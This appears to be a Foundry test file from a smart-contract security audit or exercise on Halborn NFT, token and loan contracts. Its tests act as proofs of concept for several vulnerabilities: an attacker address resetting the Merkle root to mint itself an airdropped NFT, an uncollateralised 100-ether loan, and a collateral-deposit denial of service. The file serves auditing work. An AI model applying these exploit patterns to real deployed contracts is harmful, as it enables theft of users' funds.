// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Merkle} from "./murky/Merkle.sol";

import {HalbornNFT} from "../src/HalbornNFT.sol";
import {HalbornToken} from "../src/HalbornToken.sol";
import {HalbornLoans} from "../src/HalbornLoans.sol";

contract HalbornTest is Test {
    address public immutable ALICE = makeAddr("ALICE");
    address public immutable BOB = makeAddr("BOB");

    bytes32[] public ALICE_PROOF_1;
    bytes32[] public ALICE_PROOF_2;
    bytes32[] public BOB_PROOF_1;
    bytes32[] public BOB_PROOF_2;
    bytes32[] public PROOF_1;
    bytes32[] public PROOF_2;

    HalbornNFT public nft;
    HalbornToken public token;
    HalbornLoans public loans;
    Merkle m;

    function setUp() public {
        // Initialize
        m = new Merkle();
        // Test Data
        bytes32[] memory data = new bytes32[](4);
        data[0] = keccak256(abi.encodePacked(ALICE, uint256(15)));
        data[1] = keccak256(abi.encodePacked(ALICE, uint256(19)));
        data[2] = keccak256(abi.encodePacked(BOB, uint256(21)));
        data[3] = keccak256(abi.encodePacked(BOB, uint256(24)));

        // Get Merkle Root
        bytes32 root = m.getRoot(data);

        // Get Proofs
        ALICE_PROOF_1 = m.getProof(data, 0);
        ALICE_PROOF_2 = m.getProof(data, 1);
        BOB_PROOF_1 = m.getProof(data, 2);
        BOB_PROOF_2 = m.getProof(data, 3);

        assertTrue(m.verifyProof(root, ALICE_PROOF_1, data[0]));
        assertTrue(m.verifyProof(root, ALICE_PROOF_2, data[1]));
        assertTrue(m.verifyProof(root, BOB_PROOF_1, data[2]));
        assertTrue(m.verifyProof(root, BOB_PROOF_2, data[3]));

        nft = new HalbornNFT();
        nft.initialize(root, 1 ether);

        token = new HalbornToken();
        token.initialize();

        loans = new HalbornLoans(2 ether);
        loans.initialize(address(token), address(nft));

        token.setLoans(address(loans));
    }

    function test_mintAirdropsWrongValidation() public {
        vm.startPrank(ALICE);
        nft.mintAirdrops(uint256(15), ALICE_PROOF_1);
        vm.stopPrank();
    }

    function test_setMerkleProofWithoutPermission() public {
        address Attacker = makeAddr("Attacker");

        vm.startPrank(Attacker);
        bytes32[] memory data = new bytes32[](2);
        data[0] = keccak256(abi.encodePacked(Attacker, uint256(16)));
        data[1] = keccak256(abi.encodePacked(Attacker, uint256(19)));
        bytes32 root = m.getRoot(data);

        PROOF_1 = m.getProof(data, 0);
        PROOF_2 = m.getProof(data, 1);

        nft.setMerkleRoot(root);
        nft.mintAirdrops(uint256(16), PROOF_1);
        assertEq(nft.ownerOf(16), Attacker);
        vm.stopPrank();
    }

    function test_depositNFTCollateralDOS() public {
        vm.deal(ALICE, 10 ether);
        vm.startPrank(ALICE);
        nft.mintBuyWithETH{value: 1 ether}();
        nft.approve(address(loans), uint256(1));
        loans.depositNFTCollateral(uint256(1));
    }

    function test_getLoansWithIncorrectValidation() public {
        vm.deal(ALICE, 10 ether);
        vm.startPrank(ALICE);

        loans.getLoan(100 ether);
        assertEq(token.balanceOf(address(ALICE)), 100 ether);
        vm.stopPrank();
    }
}
